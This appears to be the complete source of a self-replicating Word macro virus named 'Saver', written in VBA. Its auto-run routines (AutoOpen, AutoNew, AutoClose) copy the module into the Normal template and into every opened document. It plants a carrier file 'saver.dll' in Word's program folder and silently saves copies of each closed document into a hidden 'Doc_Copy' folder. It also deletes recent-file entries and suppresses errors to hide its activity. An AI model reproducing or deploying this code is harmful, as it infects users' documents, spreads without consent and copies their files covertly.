   Attribute VB_Name = "Saver"
   Sub Mac(dr)
   Attribute Mac.VB_Description = "Ìàêðîñ çàïèñà?02.02.00 ÊÎÍÎÒÎ?"
   Attribute Mac.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Ìàêðîñ1"
    If (Dir(dr, vbDirectory) = "") Then MkDir (dr)
   End Sub
   Sub Setup()


     On Error Resume Next

     If Word.ActiveDocument.Name = "saver.dll" Then MsgBox "Saver!"

     zz = Word.ActiveDocument.FullName

     Application.OrganizerCopy Source:=zz, _
         Destination:=Normal.ThisDocument.FullName, Name:="Saver", _
         Object:=wdOrganizerObjectProjectItems

     Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
         Destination:=zz, Name:="Saver", _
         Object:=wdOrganizerObjectProjectItems

     yy = Word.Application.Path + "\saver.dll"

     If (Dir(yy) = "") Then
       Application.Documents.Add
       Application.Documents(1).SaveAs (yy)
       Application.Documents(1).Close SaveChanges:=False
       Word.RecentFiles.Item(1).Delete
     End If


     Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
         Destination:=yy, Name:="Saver", _
         Object:=wdOrganizerObjectProjectItems
     Application.OrganizerCopy Source:=zz, _
         Destination:=yy, Name:="Saver", _
         Object:=wdOrganizerObjectProjectItems
     Application.OrganizerCopy Source:=yy, _
         Destination:=zz, Name:="Saver", _
         Object:=wdOrganizerObjectProjectItems

   End Sub
   Sub AutoNew()
     dr = Word.Application.Path + "\Doc_Copy"
     Mac (dr)
   End Sub
   Sub AutoOpen()
     Setup
     dr = Word.Application.Path + "\Doc_Copy"
     Mac (dr)
     If Word.ActiveDocument.Name = "saver.dll" Then Word.ActiveDocument.Close
   End Sub
   Sub AutoClose()
     dr = Word.Application.Path + "\Doc_Copy"
     Pat = dr + "\" + ActiveDocument.Name
     If Word.ActiveDocument.Name <> "saver.dll" Then
       On Error Resume Next
       ActiveDocument.Saved = False
       ActiveDocument.Save
       ActiveDocument.SaveAs (Pat)
     End If
     Word.RecentFiles.Item(1).Delete
   End Sub
